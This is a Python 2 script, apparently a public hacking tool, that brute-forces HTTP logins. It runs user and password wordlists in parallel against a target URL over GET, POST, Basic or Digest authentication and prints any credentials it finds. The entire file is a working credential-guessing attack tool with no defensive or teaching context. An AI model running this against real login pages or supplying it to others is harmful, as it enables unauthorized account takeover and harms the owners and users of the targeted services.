#!/usr/bin/python
#ig: @thelinuxchoice
import os
import requests
import sys
import threading
import time
import multiprocessing
import signal
sys.tracebacklimit = 0
global fork
if len(sys.argv[1:]) != 1:
   print ("Usage: python brutehttp.py [target]")
   sys.exit(0)
target = sys.argv[1]
bad_login = raw_input('Bad login word (Press enter to analyze html): ')
if len(bad_login) == 0:
   r = requests.get(target, auth=("nick","passwd"))
   print (r.text)
   sys.exit(0)
users = open(raw_input('Users wordlist: '))
wl_pass = raw_input('Passwords wordlist: ')
default_username = "username"
default_password = "password"
req_default = "1"
username = raw_input('Param1 (Default: %s): ' % default_username)
if len(username) == 0:
   username = default_username
password = raw_input('Param2 (Default: %s): ' % default_password)
if len(password) == 0:
   password = default_password

req = raw_input('Request > 1.GET (default), 2.POST, 3.Auth, 4.Digest: ')
if len(req) == 0:
   req = req_default
threads = int(raw_input('Threads: '))

def get(target, payload, user, passwd):
               print('Trying user:',user,'and password:',passwd)
               r = requests.get(target, data = payload)
               r2 = r.text
               if bad_login not in r2: 
                  print('''Found! User: {user} Password: {passwd}'''
                  .format(user=user,passwd=passwd))
                  fork = os.fork()
                  os.kill(fork, signal.SIGINT)

def post(target, payload, user, passwd):
              
               print('Trying user:',user,'and password:',passwd)
               r = requests.post(target, data = payload)
               r2 = r.text
               if bad_login not in r2: 
                  print('''Found! User: {user} Password: {passwd}'''
                  .format(user=user,passwd=passwd))
                  fork = os.fork()
                  os.kill(fork, signal.SIGINT)

def auth(target, user, passwd):
              print('Trying user:',user,'and password:',passwd)
              login = requests.get(target, auth=(user,passwd))
              if login.status_code == 200:
                 print('''Found! User: {user} Password: {passwd}'''
                 .format(user=user,passwd=passwd))
                 fork = os.fork()
                 os.kill(fork, signal.SIGINT)

def digest(target, user, passwd):
               print('Trying user:',user,'and password:',passwd)
               from requests.auth import HTTPDigestAuth
               login = requests.get(target, auth=HTTPDigestAuth(user,passwd))
               if login.status_code == 200:
                   print('''Found! User: {user} Password: {passwd}'''
                   .format(user=user,passwd=passwd))
                   fork = os.fork()
                   os.kill(fork, signal.SIGINT)
                  

def main():
   try:
      for user in users:
         passwds = open(wl_pass)
         for passwd in passwds:  
            user = user.rstrip()
            passwd = passwd.rstrip()
            payload = {username: user, password : passwd}
 
            if req == '1':
                fork = multiprocessing.Process(target=get, args=(target, payload, user, passwd))
                fork.start()

                while len(multiprocessing.active_children()) >= threads:
                       time.sleep(0.001)
                time.sleep(0.001)

            elif req == '2':
                fork = multiprocessing.Process(target=post, args=(target, payload, user, passwd))
                fork.start()

                while len(multiprocessing.active_children()) >= threads:
                       time.sleep(0.001)
                time.sleep(0.001)

            elif req == '3':
                fork = multiprocessing.Process(target=auth, args=(target, user, passwd))
                fork.start()

                while len(multiprocessing.active_children()) >= threads:
                       time.sleep(0.001)
                time.sleep(0.001)

            elif req == '4':
                fork = multiprocessing.Process(target=digest, args=(target, user, passwd))
                fork.start()

                while len(multiprocessing.active_children()) >= threads:
                       time.sleep(0.001)
                time.sleep(0.001)      

   except:
     sys.exit(0)

if __name__ == '__main__':
    main()
